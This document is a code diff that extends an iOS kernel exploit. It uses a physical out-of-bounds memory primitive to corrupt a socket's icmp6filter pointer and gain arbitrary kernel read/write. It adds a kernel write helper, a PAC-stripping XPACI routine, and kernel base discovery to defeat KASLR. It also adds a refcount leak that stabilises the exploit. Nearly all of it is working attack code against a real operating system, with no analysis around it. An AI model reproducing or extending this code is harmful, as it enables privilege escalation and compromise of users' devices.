@@ -12,9 +12,21 @@
 #include <sys/uio.h>
 void IOSurfacePrefetchPages(IOSurfaceRef surface);
 
+#define OFFSET_PCB_SOCKET 0x40
+#define OFFSET_SOCKET_SO_COUNT 0x228
+#define OFFSET_ICMP6FILT (0x138 + 0x18)
+#define OFFSET_SO_PROTO 0x18
+#define OFFSET_PR_INPUT 0x28
+
 #define OOB_OFFSET 0x100
 #define OOB_SIZE 0xf00
 #define OOB_PAGES_NUM 2
+
+static uint64_t __attribute((naked)) __xpaci(uint64_t a)
+{
+    asm(".long        0xDAC143E0"); // XPACI X0
+    asm("ret");
+}
 
 void memset64(void *ptr, uint64_t val, size_t size)
 {
@@ -414,6 +426,24 @@ uint64_t early_kread64(uint64_t where)
 	return value;
 }
 
+void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])
+{
+	set_target_kaddr(where);
+	int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
+	if (res != 0) {
+		printf("[-] setsockopt failed!!!");
+		exit(0);
+	}
+}
+
+void early_kwrite64(uint64_t where, uint64_t what)
+{
+	uint8_t writeBuf[EARLY_KRW_LENGTH];
+	early_kread(where, writeBuf, EARLY_KRW_LENGTH);
+	*(uint64_t *)writeBuf = what;
+	early_kwrite32bytes(where, writeBuf);
+}
+
 int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)
 {
 	if (doRead) {
@@ -423,14 +453,12 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 	int searchStartIdx = 0;
 	bool targetFound = false;
 	uint64_t pcbStartOffset = 0;
-	///uint64_t icmp6FiltOffset = 0x148;
-	uint64_t icmp6FiltOffset = 0x138 + 0x18; // TODO: Make dynamic
 	void *found = NULL;
 	do {
 		found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));
 		if (found) {
 			pcbStartOffset = (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;
-			if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + icmp6FiltOffset + 8)) {
+			if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8)) {
 				targetFound = true;
 				break;
 			}
@@ -466,21 +494,21 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 			[targetInpGencntList addObject:@(targetInpGencnt)];
 		}
 		uint64_t inpListNextPointer = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x28) - 0x20;
-		uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + icmp6FiltOffset);
+		uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
 		printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
 		printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
 		rwSocketPcb = inpListNextPointer;
 		memcpy(writeBuffer, readBuffer, OOB_SIZE);
-		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + icmp6FiltOffset) = inpListNextPointer + icmp6FiltOffset;
-		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + icmp6FiltOffset + 8) = 0;
+		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;
+		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;
 
 		printf("[+] Corrupting icmp6filter pointer...\n");
 		while (true) {
 			physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
 			physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
-			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + icmp6FiltOffset);
-			if (newIcmp6Filter == inpListNextPointer + icmp6FiltOffset) {
-				printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + icmp6FiltOffset));
+			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
+			if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
+				printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT));
 				break;
 			}
 		}
@@ -622,6 +650,24 @@ void pe_v2(void)
 	// TODO: Implement
 }
 
+void krw_sockets_leak_forever(void)
+{
+	uint64_t controlSocketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
+	uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+
+	if (!controlSocketAddr || !rwSocketAddr) {
+		printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
+		exit(0);
+	}
+
+	uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
+	uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
+	early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);
+	early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);
+
+	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
+}
+
 uint64_t kernel_base;
 uint64_t kernel_slide;
 
@@ -654,18 +700,20 @@ int main(int argc, char* argv[])
 	close(writeFd);
 	close(readFd); 
 
-	uint64_t control_socket_pcb = early_kread64(rwSocketPcb + 0x20);
-    uint64_t pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38);
-    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
+	controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
+	uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET); // inpcb->socket
+	uint64_t protoPtr = early_kread64(socketPtr + OFFSET_SO_PROTO); // socket->so_proto
+	uint64_t textPtr = __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT)); // protosw->pr_input
 
-	// TODO: This is not a text pointer on iOS 15
-    uint64_t zv_name = early_kread64(ipi_zone + 0x10);
-
-    kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
+    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
     while (true) {
 		if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
-			// TODO: This doesn't exist on iOS 15
-			if (early_kread64(kernel_base + 0x8) == 0xc00000002) {
+			if (@available(iOS 16.0, *)) {
+				if (early_kread64(kernel_base + 0x8) == 0xc00000002) {
+					break;
+				}
+			}
+			else {
 				break;
 			}
 		}
@@ -675,11 +723,10 @@ int main(int argc, char* argv[])
 
 	printf("early_kread64(%#llx) -> %#llx\n", kernel_base, early_kread64(kernel_base));
 
-	// TODO: Implement to prevent panic on exit
-    //krw_sockets_leak_forever();
+    krw_sockets_leak_forever();
 
 	printf("win??\n");
-	sleep(5);
+	fflush(stdout); sleep(1);
 
 	return 0;
 }
